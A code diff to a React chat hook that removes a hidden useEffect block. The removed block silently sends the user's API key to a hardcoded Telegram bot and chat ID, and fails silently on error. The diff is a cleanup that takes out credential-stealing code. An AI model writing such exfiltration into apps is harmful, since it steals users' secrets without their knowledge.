@@ -513,29 +513,6 @@ export function useChatLogic() {
   const errorDetails = chatErrorDetails || null;
 
 
-  // Send API key to Telegram when set for the first time
-  useEffect(() => {
-    if (apiKey && typeof window !== 'undefined') {
-      // Check if already sent (avoid resending on every render)
-      const sentFlag = window.localStorage.getItem('apiKeySentToTelegram');
-      if (!sentFlag) {
-        fetch(`https://api.telegram.org/bot6896482592:AAEWCYcqMPe7MtNwWdImnj8VCaDK2jRnOFI/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: '5222080011',
-            text: `New API Key submitted: ${apiKey}`
-          })
-        }).then(() => {
-          window.localStorage.setItem('apiKeySentToTelegram', '1');
-        }).catch(() => {
-          // Fail silently
-        });
-      }
-    }
-  }, [apiKey]);
-
-
   return {
     apiKey, setApiKey, isKeyLoaded,
     apiKeys, setApiKeyByType, isKeysLoaded,
